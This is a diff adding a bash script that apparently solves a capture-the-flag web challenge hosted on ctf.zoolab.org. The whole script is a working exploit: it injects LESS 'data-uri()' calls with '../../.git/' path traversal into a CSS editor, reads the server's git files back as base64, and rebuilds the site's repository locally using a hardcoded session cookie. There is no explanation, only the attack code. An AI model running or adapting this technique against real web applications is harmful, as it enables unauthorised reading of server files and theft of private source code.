@@ -1,0 +1,58 @@
+#!/bin/bash
+
+function downloadBlob {
+	echo downloadBlob $1
+
+	mkdir -p ${1:0:2}
+	cd $_
+
+    curl -s --cookie "PHPSESSID=mk1lmshlv4ptuchrmetah1qvcl" https://pasteweb.ctf.zoolab.org/editcss.php -L -d "less=p{content:data-uri('../../.git/objects/${1:0:2}/${1:2}');}" > /dev/null
+    curl -s http://pasteweb.ctf.zoolab.org/view.php\?id\=de21962d5fae776f970e61f392971de7 -L | awk -F'"' 'NR==8{print $2}' | awk -F, '{print $2}' | base64 -d  > ${1:2}
+
+	cd ..
+}
+
+function parseTree {
+	echo parseTree $1
+
+	downloadBlob $1
+
+	while read line
+	do
+		type=$(echo $line | awk '{print $2}')
+		hash=$(echo $line | awk '{print $3}')
+
+		[ "$type" = "tree" ] && parseTree $hash || downloadBlob $hash
+	done < <(git cat-file -p $1)
+}
+
+function parseCommit {
+	echo parseCommit $1
+
+	downloadBlob $1
+
+	tree=$(git cat-file -p $1| sed -n '1p' | awk '{print $2}')
+	parseTree $tree
+
+	parent=$(git cat-file -p $1 | sed -n '2p' | awk '{print $2}')
+
+	[ ${#parent} -eq 40 ] && parseCommit $parent
+}
+
+curl -s --cookie "PHPSESSID=mk1lmshlv4ptuchrmetah1qvcl" https://pasteweb.ctf.zoolab.org/editcss.php -L -d "less=p{content:data-uri('../../.git/HEAD');}" > /dev/null
+ref=$(curl -s http://pasteweb.ctf.zoolab.org/view.php\?id\=de21962d5fae776f970e61f392971de7 -L | awk -F'"' 'NR==8{print $2}' | awk -F, '{print $2}'| base64 -d | awk '{print $2}')
+
+curl -s --cookie "PHPSESSID=mk1lmshlv4ptuchrmetah1qvcl" https://pasteweb.ctf.zoolab.org/editcss.php -L -d "less=p{content:data-uri('../../.git/$ref');}" > /dev/null
+lastHash=$(curl -s http://pasteweb.ctf.zoolab.org/view.php\?id\=de21962d5fae776f970e61f392971de7 -L | awk -F'"' 'NR==8{print $2}' | awk -F, '{print $2}'| base64 -d)
+
+git init
+
+cd .git/objects/
+
+parseCommit $lastHash
+
+cd ../../
+
+echo $lastHash > .git/refs/heads/master
+
+git reset --hard
